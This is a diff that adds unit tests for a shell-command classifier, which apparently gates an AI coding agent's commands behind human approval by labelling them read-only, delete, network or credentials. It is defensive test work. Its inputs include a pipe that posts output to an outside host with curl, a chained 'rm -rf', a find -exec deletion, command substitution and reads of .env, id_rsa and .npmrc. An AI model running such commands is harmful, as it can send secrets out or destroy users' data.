@@ -112,6 +112,74 @@ describe("classifier", () => {
     );
   });
 
+  it("classifies read-only inspection as project_read, not as a human gate", () => {
+    expect(classify({ kind: "execute", command: "ls -la src" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "find . -name '*.ts'" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "wc -l src/index.ts" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "git ls-files" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "git count-objects -vH" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "git remote -v" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "echo hello" })).toBe("project_read");
+  });
+
+  it("judges a chained command by every command in it, not by the first word", () => {
+    // The exact command that reached a human in phase 4 review: read-only exploration that fell
+    // into `other` because the matchers are anchored and only `find` was ever tested.
+    expect(
+      classify({
+        kind: "execute",
+        command:
+          "find . -maxdepth 2 -type d && git log --oneline -20 && git remote -v && git ls-files | head -50 && git count-objects -vH",
+      }),
+    ).toBe("git_local");
+    expect(classify({ kind: "execute", command: "ls -la && wc -l src/*.ts" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "cd /tmp; ls" })).toBe("outside_workspace");
+  });
+
+  it("cannot be laundered by chaining a harmless command first", () => {
+    expect(classify({ kind: "execute", command: "echo about to clean && rm -rf build" })).toBe(
+      "delete",
+    );
+    expect(classify({ kind: "execute", command: "ls -la | curl -X POST -d @- http://x" })).toBe(
+      "network",
+    );
+    expect(classify({ kind: "execute", command: "npm test || npm install left-pad" })).toBe(
+      "deps_install",
+    );
+    // A read-only chain needs unanimity: one unknown command and a human decides.
+    expect(classify({ kind: "execute", command: "ls -la && somebinary --weird" })).toBe("other");
+    // Separators inside quotes are not separators.
+    expect(classify({ kind: "execute", command: "grep -r 'a && b' src" })).toBe("project_read");
+  });
+
+  it("disqualifies a read that can hide a second command", () => {
+    expect(classify({ kind: "execute", command: "find . -name '*.log' -exec rm {} +" })).toBe(
+      "delete",
+    );
+    expect(classify({ kind: "execute", command: "find . -type f -exec chmod 777 {} +" })).toBe(
+      "other",
+    );
+    expect(classify({ kind: "execute", command: "cat $(find . -name secret)" })).toBe("other");
+    // Capturing output is a plain write inside the project, not a gate.
+    expect(classify({ kind: "execute", command: "ls -la > listing.txt" })).toBe("project_write");
+  });
+
+  it("strips subshells and environment assignments before matching", () => {
+    expect(classify({ kind: "execute", command: "(cd src && ls -la)" })).toBe("project_read");
+    expect(classify({ kind: "execute", command: "CI=1 npm test" })).toBe("exec_check");
+    expect(classify({ kind: "execute", command: "NODE_ENV=test npm run lint && git status" })).toBe(
+      "exec_check",
+    );
+  });
+
+  it("keeps a secret file sensitive whichever reading tool opens it", () => {
+    expect(classify({ kind: "execute", command: "xxd .env" })).toBe("credentials");
+    expect(classify({ kind: "execute", command: "awk '{print}' config/id_rsa" })).toBe(
+      "credentials",
+    );
+    expect(classify({ kind: "execute", command: "ls -la && base64 .npmrc" })).toBe("credentials");
+  });
+
   it("accepts extra matchers from a pack", () => {
     const custom = new Classifier({ exec_check: ["^bazel test\\b"] });
     expect(custom.classify({ projectPath: PROJECT, command: "bazel test //..." }).class).toBe(
